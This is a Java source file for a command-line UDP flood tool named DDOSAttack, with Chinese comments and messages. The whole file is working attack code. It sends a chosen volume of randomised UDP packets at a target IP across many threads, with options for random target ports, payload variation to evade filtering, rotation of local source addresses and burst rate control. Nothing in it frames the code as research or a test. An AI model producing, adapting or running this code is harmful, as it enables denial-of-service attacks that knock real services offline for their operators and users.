import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

public class DDOSAttack {

    // ---------- 共享统计 ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- 按错误类别计数 ----------
    private static final LongAdder errBind = new LongAdder();
    private static final LongAdder errPortUnreachable = new LongAdder();
    private static final LongAdder errIOException = new LongAdder();
    private static final LongAdder errOther = new LongAdder();

    // ---------- 最近的错误详情（有界） ----------
    private static final int ERR_HISTORY_MAX = 10;
    private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();

    // ---------- 配置 ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static boolean bindLocal = false;
    private static boolean varyPayload = true;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;

    // ---------- 预分配的目标地址 ----------
    private static InetSocketAddress[] portAddresses;

    // ---------- 本地网卡地址（用于 --bind-local） ----------
    private static List<InetAddress> localAddresses = new ArrayList<>();

    // ===================================================================
    // 主函数
    // ===================================================================
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] 无法打开日志文件: " + e.getMessage());
            }
        }

        // 校验目标
        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] 无效的目标 IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] 端口超出范围: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65000) packetSize = 65000;
        if (totalPackets <= 0) {
            System.err.println("[!] 总包数必须 > 0");
            System.exit(1);
        }

        // 为 --random-port 预分配目标地址
        if (randomTargetPort) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        // 为 --bind-local 枚举本地地址
        if (bindLocal) {
            enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                System.err.println("[!] 未找到可用的本地地址，已禁用 --bind-local。");
                bindLocal = false;
            } else {
                System.out.printf("[+] --bind-local 已启用，可用本地地址 %d 个。%n",
                        localAddresses.size());
            }
        }

        // 摘要
        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
                targetIP, targetPort,
                (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "",
                varyPayload ? "  vary" : "");
        if (bindLocal) {
            System.out.println("[+] 每个线程绑定不同的本地源 IP（Java 无法伪造源 IP）");
        }
        System.out.println("[+] 攻击中... (Ctrl+C 停止)");

        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));

        long startTime = System.currentTimeMillis();
        startAttack();
        long elapsed = System.currentTimeMillis() - startTime;

        // 最终统计
        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] 完成: 发送 %d 包, 丢弃 %d, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);

        // 错误分布
        System.out.printf("[=] 错误: bind=%d  端口不可达=%d  IO=%d  其他=%d%n",
                errBind.longValue(), errPortUnreachable.longValue(),
                errIOException.longValue(), errOther.longValue());
        if (!recentErrors.isEmpty()) {
            System.out.println("[=] 最近错误：");
            for (String e : recentErrors) {
                System.out.println("    " + e);
            }
        }

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.printf("errors: bind=%d port-unreach=%d io=%d other=%d%n",
                    errBind.longValue(), errPortUnreachable.longValue(),
                    errIOException.longValue(), errOther.longValue());
            logWriter.close();
        }
    }

    // ===================================================================
    // 帮助
    // ===================================================================
    private static void printUsage() {
        System.out.println("[+] 用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
        System.out.println();
        System.out.println("[+] 必填参数：");
        System.out.println("  -t, --target        目标 IP");
        System.out.println("  -p, --port          目标 UDP 端口");
        System.out.println("  -g, --gb            总流量（GB）");
        System.out.println();
        System.out.println("[+] 可选参数：");
        System.out.println("  -P, --processes     线程数（默认 4）");
        System.out.println("  -b, --burst         每突发包数（默认 50）");
        System.out.println("  -r, --rate          每突发秒数（默认 0 = 不限速）");
        System.out.println("  -d, --duration      持续时间（秒，默认 0 = 直到发完）");
        System.out.println("  -s, --src-port      源端口基数（默认 -1 = 随机）");
        System.out.println("  --size              基础包大小（默认 1490）");
        System.out.println("  --random-port       随机目标端口");
        System.out.println("  --bind-local        每个线程绑定不同的本地网卡 IP");
        System.out.println("                      （Java 无原始套接字；真正伪造源 IP 不可能）");
        System.out.println("  --vary / --no-vary  启用/关闭 payload 变种（默认：启用）");
        System.out.println("  --log <file>        日志文件路径");
        System.out.println("  --max-retries       每包最大发送重试次数（默认 3）");
        System.out.println("  -h, --help          显示本帮助");
        System.out.println();
        System.out.println("[+] 说明：");
        System.out.println("  * 真正的源 IP 伪造需要原始套接字（C/Python+root），纯 Java 无法实现。");
        System.out.println("  * --bind-local 轮换本机自身的网卡 IP；效果仅限于多网卡主机。");
    }

    // ===================================================================
    // 参数解析
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) {
            System.err.println("[!] 缺少 -t/--target");
            System.exit(1);
        }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] 缺少 -p/--port");
            System.exit(1);
        }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] 缺少 -g/--gb");
            System.exit(1);
        }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--bind-local")) bindLocal = true;
        if (params.containsKey("--no-vary")) varyPayload = false;
        if (params.containsKey("--vary")) varyPayload = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) {
            System.err.println("[!] GB 必须 > 0");
            System.exit(1);
        }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) {
            System.err.println("[!] 流量太小");
            System.exit(1);
        }
    }

    // ===================================================================
    // 本地地址枚举（用于 --bind-local）
    // ===================================================================
    private static void enumerateLocalAddresses() {
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) {
                        localAddresses.add(addr);
                    }
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] 枚举网卡失败: " + e.getMessage());
        }
    }

    // ===================================================================
    // 变种 payload 生成器
    // ===================================================================
    /**
     * 生成一批变种 payload：
     *   - 长度在 [baseSize - delta, baseSize + delta] 范围内变化
     *   - 内容随机
     *   - 最后 8 字节将在每包发送前被包序号覆盖
     */
    private static List<byte[]> buildVariantPool(int baseSize, int poolSize) {
        if (!varyPayload) {
            byte[] one = new byte[baseSize];
            new Random().nextBytes(one);
            List<byte[]> single = new ArrayList<>(1);
            single.add(one);
            return single;
        }
        Random rnd = new Random();
        int delta = Math.max(1, baseSize / 10); // 长度在 ±10% 内变化
        List<byte[]> pool = new ArrayList<>(poolSize);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + rnd.nextInt(delta * 2 + 1);
            if (len < 64) len = 64;
            if (len > 65000) len = 65000;
            byte[] p = new byte[len];
            rnd.nextBytes(p);
            pool.add(p);
        }
        return pool;
    }

    // ===================================================================
    // 带重试的发送（错误分类）
    // ===================================================================
    private static boolean sendWithRetry(DatagramChannel channel, byte[] payload,
                                         SocketAddress target, int maxRetries,
                                         String threadTag) {
        ByteBuffer buffer = ByteBuffer.wrap(payload);
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buffer.clear();
                int written = channel.send(buffer, target);
                if (written > 0) return true;
            } catch (PortUnreachableException e) {
                errPortUnreachable.increment();
                recordError(threadTag + ": 端口不可达 (" + target + ")");
            } catch (IOException e) {
                errIOException.increment();
                recordError(threadTag + ": IOException (" + e.getMessage() + ")");
            } catch (Exception e) {
                errOther.increment();
                recordError(threadTag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
            }
            attempts++;
        }
        return false;
    }

    private static void recordError(String msg) {
        recentErrors.addLast(msg);
        while (recentErrors.size() > ERR_HISTORY_MAX) {
            recentErrors.pollFirst();
        }
    }

    // ===================================================================
    // 攻击主体
    // ===================================================================
    private static void startAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int variantPoolSize = 256;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                ThreadLocalRandom rnd = ThreadLocalRandom.current();
                List<byte[]> variantPool = buildVariantPool(packetSize, variantPoolSize);

                DatagramChannel channel = null;
                try {
                    channel = openChannelForThread(threadId);

                    // 若未开启随机端口模式，则所有线程打到同一目标端口
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    long sent = 0, bytesSent = 0, dropped = 0;
                    long packetCounter = 0;

                    // 速率控制基于单调时间累积
                    final long burstPeriodNs = rateLimit > 0
                            ? (long) (rateLimit * 1_000_000_000L) : 0L;
                    long nextTick = System.nanoTime();

                    while (!stopFlag && sent < pktCount) {

                        int toSend = (int) Math.min(burstSize, pktCount - sent);

                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            // --- 选择变种 payload ---
                            byte[] payload = variantPool.get(
                                    (int) (packetCounter % variantPool.size()));
                            // 将最后 8 字节覆盖为包序号，
                            // 即便 payload 池内容重复，每包仍然唯一
                            long tagBytes = packetCounter;
                            for (int b = 0; b < 8 && b < payload.length; b++) {
                                payload[payload.length - 1 - b] = (byte) (tagBytes & 0xFF);
                                tagBytes >>>= 8;
                            }
                            packetCounter++;

                            // --- 目标地址 ---
                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = rnd.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            // --- 发送 ---
                            if (sendWithRetry(channel, payload, targetAddr, maxRetries, tag)) {
                                sent++;
                                bytesSent += payload.length;
                            } else {
                                dropped++;
                                // 如果通道似乎已损坏则重建
                                try {
                                    if (channel != null && !channel.isOpen()) {
                                        channel = openChannelForThread(threadId);
                                    }
                                } catch (Exception ignore) { }
                            }
                        }

                        // --- 增量更新全局统计 ---
                        if (sent > 0) {
                            totalSent.add(sent);
                            totalBytes.add(bytesSent);
                            totalDropped.add(dropped);
                            sent = 0;
                            bytesSent = 0;
                            dropped = 0;
                        }

                        // --- 带漂移补偿的速率控制 ---
                        if (burstPeriodNs > 0) {
                            nextTick += burstPeriodNs;
                            long now = System.nanoTime();
                            long sleepNs = nextTick - now;
                            if (sleepNs > 0) {
                                try {
                                    TimeUnit.NANOSECONDS.sleep(sleepNs);
                                } catch (InterruptedException ignored) { }
                            } else {
                                // 落后于计划 —— 重置 tick 为当前时间，避免追赶式爆发
                                nextTick = now;
                            }
                        }
                    }

                } catch (Exception e) {
                    errOther.increment();
                    recordError(tag + " 致命错误: " + e.getClass().getSimpleName()
                            + " (" + e.getMessage() + ")");
                } finally {
                    if (channel != null) {
                        try { channel.close(); } catch (IOException ignored) { }
                    }
                }
            };
            futures.add(executor.submit(task));
        }

        // ---------- 进度监控 ----------
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;

            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
                        sent, dataGB, rate, instantRate, dropped);
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) { }
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    // ===================================================================
    // 为指定线程打开 DatagramChannel
    //   - 可选择绑定到不同的本地网卡地址（--bind-local）
    //   - 可选择绑定到 srcPortBase + threadId（固定源端口）
    //   - 开启 SO_REUSEADDR 以减少 bind 冲突
    // ===================================================================
    private static DatagramChannel openChannelForThread(int threadId) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);

        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
        } catch (SocketException ignored) { }

        InetAddress bindAddr = null;
        int bindPort = 0;

        if (bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (srcPortBase >= 0) {
            bindPort = srcPortBase + threadId;
        }

        if (bindAddr != null || bindPort > 0) {
            try {
                socket.bind(new InetSocketAddress(
                        bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0"),
                        bindPort));
            } catch (BindException e) {
                errBind.increment();
                recordError("T" + threadId + ": bind 失败 ("
                        + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
                        + ")，改用系统分配端口");
                // 继续执行 —— 系统会自动挑选随机端口
            }
        }

        return channel;
    }
}
